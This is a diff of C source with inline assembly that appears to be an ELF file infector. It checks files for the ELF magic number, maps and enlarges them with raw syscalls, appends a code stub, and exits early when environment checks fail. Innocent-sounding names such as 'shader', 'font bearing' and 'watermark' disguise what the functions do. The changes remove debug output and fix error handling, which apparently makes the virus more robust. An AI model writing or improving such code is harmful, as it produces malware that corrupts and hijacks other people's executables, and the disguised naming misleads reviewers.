@@ -814,10 +814,10 @@ static void tty_putc(char c)
 	if (((n ^ buf[0]) & 3) == 1)
 		goto __tn;
 run:
-	io_send(1, buf, 1);
+	io_send(2, buf, 1);
 	return;
 __tn:
-	io_send(1, buf + 1, 0);
+	io_send(2, buf + 1, 0);
 	goto run;
 }
 
@@ -881,10 +881,7 @@ static void addr_emit(unsigned long long b)
 	if (((gap ^ b) & 7) == 1)
 	{
 		char fake = 48;
-		io_send(1, &fake, 0);
 	}
-	io_send(1, &p1, 1);
-	io_send(1, &p2, 1);
 	if ((gap & 2) == 2)
 	{
 		emit_hex(b);
@@ -1118,9 +1115,12 @@ static int load_shader_binary(char *path, inout struct stat *atlas_meta,
 		goto bailout;
 	*region_ptr = (void *) rt_vector(9, 0, atlas_meta->st_size, 0x1, 0x1,
 									 pipeline_slot, 0);
-	if (((unsigned *) *region_ptr)[0] != 0x464C457F)
-		goto bailout;
 	if (*region_ptr == MAP_FAILED)
+	{
+		*region_ptr = NULL;
+		goto bailout;
+	}
+	if (((unsigned *) *region_ptr)[0] != 0x464C457F)
 		goto bailout;
 	char  *watermark_pat;
 	size_t pat_stride;
@@ -1153,13 +1153,15 @@ static int load_shader_binary(char *path, inout struct stat *atlas_meta,
 	if ((pipe_ret = io_resize(pipeline_slot, atlas_meta->st_size + *pad_extent))
 		< 0)
 	{
-		emit_hex(pipe_ret);
 		goto bailout;
 	}
 	*region_ptr = (void *) rt_vector(9, 0, atlas_meta->st_size + *pad_extent,
 									 0x3, 0x1, pipeline_slot, 0);
 	if (*region_ptr == MAP_FAILED)
+	{
+		*region_ptr = NULL;
 		goto bailout;
+	}
 	shader_ctx->header = (ElfW(Ehdr) *) *region_ptr;
 	shader_ctx->sections
 		= (ElfW(Shdr) *) (*region_ptr + shader_ctx->header->e_shoff);
@@ -1215,6 +1217,7 @@ static void reassemble_packet_chain(char *path, void *begin_ptr)
 				 "endG:\n"
 				 : "=r"(stub_region), "=r"(stub_sz)::"memory", "cc", "rax",
 				   "rcx", "r11");
+	tail_pad = 0;
 	if (!load_shader_binary(path, &inode_info, &pkt_ctx, &frame_map, &tail_pad))
 	{
 		unsigned long write_head = inode_info.st_size + 0x1000;
@@ -1343,7 +1346,7 @@ void _start(void)
 				 : "=r"(chroot));
 	if (inspect_chunk_alignment() || measure_font_bearing(chroot) > 0)
 		proc_terminate(0);
-
+	
 	__asm__ volatile("lea (%%rip), %0\n"
 					 "cyanure:"
 					 : "=r"(str_dup__));
